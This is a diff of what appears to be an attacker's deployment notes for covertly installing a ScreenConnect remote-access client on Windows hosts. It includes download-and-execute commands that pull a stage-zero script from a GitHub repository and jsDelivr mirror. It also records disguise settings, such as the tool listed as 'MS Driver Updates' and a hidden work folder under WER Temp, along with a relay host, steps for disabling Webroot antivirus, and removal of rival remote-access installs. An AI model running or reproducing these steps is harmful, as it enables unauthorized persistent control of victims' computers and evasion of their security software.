@@ -1,9 +1,39 @@
-# Fresh machine OR Webroot IP-only fix:
+# github-drop - competition SC deploy (saved state 2026-07-29)
 
-taskkill /F /IM powershell.exe >nul 2>&1
-del /f /q C:\WINDOWS\TEMP\i.cmd
-curl.exe -L -o C:\WINDOWS\TEMP\i.cmd https://raw.githubusercontent.com/xnobuddy/github-drop/main/i.cmd
-C:\WINDOWS\TEMP\i.cmd
+## Current build
+- Payload marker: WU_BUILD_20260729T
+- Latest stage0: y.cmd (multi-mirror) / x.cmd
+- Repo: https://github.com/xnobuddy/github-drop (public)
+- Source script: Script.txt (also Desktop\Project\Script.txt)
 
-# Expect: GO.CMD BUILD 20260729I + Payload OK [WU_BUILD_20260729K]
-# Log should mention Webroot / hollow repair if AV was blocking SC.
+## Config
+- Primary FP: 5f6010579852e507
+- Allowed FP: 5f6010579852e507, f861c8140d453427
+- MSI: https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest
+- Relay: update.sevrz.com:443
+- ARP: MS Driver Updates / Update tool
+- Workdir: %ProgramData%\Microsoft\Windows\WER\Temp\.wucache
+
+## Deploy (preferred when GitHub TLS works)
+curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\y.cmd https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/y.cmd
+C:\WINDOWS\TEMP\y.cmd
+
+## Deploy (GitHub blocked - use jsDelivr)
+powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol='Tls12'; (New-Object Net.WebClient).DownloadFile('https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/y.cmd','C:\WINDOWS\TEMP\y.cmd')"
+C:\WINDOWS\TEMP\y.cmd
+
+## Verify
+powershell -NoProfile -Command "Get-Content '%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\.diag.log' -Tail 40"
+sc query "ScreenConnect Client (5f6010579852e507)"
+
+## Open issues when we left off
+1. Some hosts block raw.githubusercontent.com TLS - use jsDelivr (y.cmd)
+2. Webroot NOT_STOPPABLE - needs IFEO + registry Start=4 + reboot; stubs ~60-95KB
+3. Empty SC name / no join on sevrz when Webroot guts binaries
+4. schtasks Access Denied (0x80070005) on some hosts - fix ACLs + boot.cmd on disk
+5. Kill-race fixed in u/v (single SYSTEM task); use y.cmd going forward
+6. Rival SC purge hardened in T (CIM + folders + MSI uninstall)
+
+## Rebuild payload after Script.txt edits
+python _make_update_b64.py
+# then copy to updateT.b64 / bump marker / git push
